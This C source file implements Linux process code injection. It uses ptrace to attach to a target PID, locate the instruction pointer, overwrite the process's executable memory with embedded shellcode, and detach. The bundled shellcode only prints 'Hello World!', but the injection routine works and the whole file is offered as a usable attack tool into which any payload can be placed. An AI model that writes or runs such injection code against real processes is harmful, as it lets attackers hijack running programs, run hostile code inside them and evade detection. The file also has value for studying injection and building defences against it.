/*
    Copyright (C) 2023  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ptrace.h>

unsigned char shellcode[] = "\x48\xb8\x72\x6c\x64\x21\x0a\x00\x00\x00\x50\x48\xb8\x48\x65\x6c"
                            "\x6c\x6f\x20\x57\x6f\x50\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6"
                            "\x48\xc7\xc2\x0d\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05";

int main(int argc, char **argv) {
        if (argc != 2) {
                fputs("USAGES: shellcode_injection_Linux <pid>", stderr);
                return 1;
        }
        unsigned int pid = atoi(argv[1]);

        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) {
                fputs("ptrace attach failed", stderr);
                return 2;
        }

        if (waitpid(pid, NULL, 0) != pid) {
                fputs("wait pid failed", stderr);
                return 3;
        }

        struct user_regs_struct registers;
        if (ptrace(PTRACE_GETREGS, pid, NULL, &registers) != 0) {
                fputs("ptrace get registers failed", stderr);
                return 4;
        }

        long long unsigned int shellcode_pointer = registers.rip + 2;

        long unsigned int * shellcode_parts = (long unsigned int *)shellcode;
        for (unsigned int index = 0; index * 8 < sizeof(shellcode); index += 1) {
                if (ptrace(PTRACE_POKETEXT, pid, shellcode_pointer, shellcode_parts[index]) != 0) {
                        fputs("ptrace write data failed", stderr);
                        return 5;
                }
                shellcode_pointer += 8;
        }

        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) != 0) {
                fputs("ptrace detach failed", stderr);
                return 6;
        }

        return 0;
}
